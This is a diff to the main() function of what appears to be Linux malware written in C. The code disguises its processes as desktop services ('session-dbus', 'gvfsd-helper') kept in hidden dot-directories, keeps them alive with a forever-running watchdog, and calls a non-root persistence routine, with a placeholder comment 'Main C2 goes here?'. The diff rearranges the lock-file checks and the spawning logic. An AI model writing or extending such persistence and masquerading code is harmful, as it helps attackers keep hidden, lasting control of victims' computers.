@@ -17,31 +17,29 @@ int main(int argc, char *argv[]) {
 
     pid_t id = getuid();
 
+    // perform file lock check here to see what's currently locked or not.
+
     // TODO: *fpath = session_dbus_file_write
-
     // Spawn session-dbus (monitor)
-    if (access("/home/gdev/.X11/X0-lock", F_OK) == 0) {
 
-        // if pwd , spawn session-dbus
-        if (get_pwd() == true) {
-            if (id != 0 ) { // non-root
-                //daemon(0, 0);
-                spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
-            }
-            do {
-            // forever run session-dbus as a "watchdog process".
-            sleep(10);
-            }while(true);
+    //if session-dbus lock file is locked... creat the lock for gvfsd and spawn gvfsd
+    if (lock_check("/home/gdev/.X11/.X11-lock") != 0) {
+
+        create_lock(1);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
+
+        if (id != 0 ) { // non-root
+           // daemon(0, 0);
+           // spawn gvfsd-helper
+            spawn_thread_watchdog(1);
         }
 
-    } else {
-        #ifdef DEBUG
-        fprintf(stderr, "First time running, creating locks!!");
-        #endif
-        create_lock();  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
-    }
+        do {
+        // forever run session-dbus as a "watchdog process".
+            sleep(10);
+        }while(true);
 
-    bool desktop_res = nonroot_persistence();
+    }
+bool desktop_res = nonroot_persistence();
     if (desktop_res == false ) {
         fprintf(stderr, "[main] Error creating non-root persistence: %s",strerror(errno));
         exit(1);
@@ -56,9 +54,12 @@ int main(int argc, char *argv[]) {
         //daemon(0, 0);  // detach from current console
         // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
         printf("initial spawn of gvfsd-helper\n");
-        spawn_thread_watchdog(0, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
-        // Main C2 goes here?
 
+        // creating .X11/X0-lock
+        create_lock(0);
+        //session-dbus create
+        spawn_thread_watchdog(0);
+        // Main C2 goes here?
     }
 
     #ifndef DEBUG
